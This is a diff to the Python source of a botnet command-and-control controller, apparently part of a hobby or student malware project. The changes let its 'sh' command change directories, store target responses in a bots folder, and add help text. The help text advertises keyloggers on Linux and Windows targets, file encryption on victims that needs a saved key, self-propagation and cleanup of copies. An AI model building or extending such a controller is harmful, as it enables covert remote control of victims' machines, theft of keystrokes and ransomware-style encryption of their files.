@@ -10,7 +10,7 @@ MODULE NAME: ______
 try:
 	import socket # Import socket for creating TCP connection.
 	from time import sleep # Import sleep from time to halt execution of program when necessary.
-	from os import devnull, _exit, system # Import devnull for error, _exit for safe exit, system for clear screen.
+	from os import devnull, _exit, system, chdir # Import os for exiting, changing dir, devnull file
 	from sys import exit # Import exit from sys to quit program when specified.
 	from threading import Thread # Import Timer to create threads for our functions.
 	from queue import Queue # Import Queue to use queue data structure functions.
@@ -33,7 +33,7 @@ THREAD_IDS = [1, 2] # Thread identifiers.
 BUFFER = 20000 # Maximum number of bytes to accept from the output of command.
 COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
 ENCODING = 'utf-8' # Encoding scheme.
-DIRECTORY = './' # Directory to store target response files in.
+DIRECTORY = './bots/' # Directory to store target response files in.
 
 # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
@@ -215,7 +215,14 @@ class BotnetCmdCtrl:
 					i += 1
 
 			elif cmd[:2] == 'sh': # Execute shell command on host machine.
-				run(cmd[3:].split())
+				try:
+					run(cmd[3:].strip().split())
+				except:
+					try:
+						chdir(cmd[6:])
+						print(RED + "Ok" + RESET)
+					except:
+						print(RED + 'Couldn\'t run command: ' + RESET + cmd[3:])
 
 			elif cmd[:10] == 'select lin': # Select the Linux target to connect to.
 				index = int(cmd[11:].strip())
@@ -230,9 +237,9 @@ class BotnetCmdCtrl:
 
 			elif cmd.strip() == 'check mode': # Check what write mode the program is in.
 				if self.output_to_file:
-					print(GREEN + 'Mode', RESET, '= write to stdout and file.')
+					print(GREEN + 'Mode' + RESET + ' = write to stdout and file.')
 				else:
-					print(GREEN + 'Mode' + RESET + '= write to stdout.')
+					print(GREEN + 'Mode' + RESET + ' = write to stdout.')
 
 			elif cmd.strip() == 'clear':
 				system('clear')
@@ -386,8 +393,11 @@ class BotnetCmdCtrl:
 		print(ORANGE, '  switch >', RESET, 'Switch writing modes: to std out, or to stdout and file.')
 		print(ORANGE, '  check mode >', RESET, 'Check write mode.')
 		print(ORANGE, '  lin|win keylog >', RESET, 'Begin a keylogger, store data in tmp folder, file name log.txt.')
-		print(ORANGE, '  lin|win encrypt [path or file]->', RESET, 'Encrypt a file. Save the encryption key!')
-		print(ORANGE, '  lin|win decrypt [path or file] [key]->', RESET, 'Decrypt a file.')
+		print(ORANGE, '  lin|win encrypt [path or file] >', RESET, 'Encrypt a file. Save the encryption key!')
+		print(ORANGE, '  lin|win decrypt [path or file] [key] >', RESET, 'Decrypt a file.')
+		print(ORANGE, '  propagate >', RESET, "Copy client file to three different directory.")
+		print(ORANGE, '  destroy >', RESET, "Attempt to delete the copies of the program on target machines.")
+		print(ORANGE, '  sh [command] >', RESET, 'Execute command on the host machine.')
 		print(ORANGE, '  clear >', RESET, 'Clear the screen.')
 		print(ORANGE, '  quit >', RESET, "Quit the program.", end='\n\n')
 		print(PURPLE, 'Commands when connected to target:', RESET)
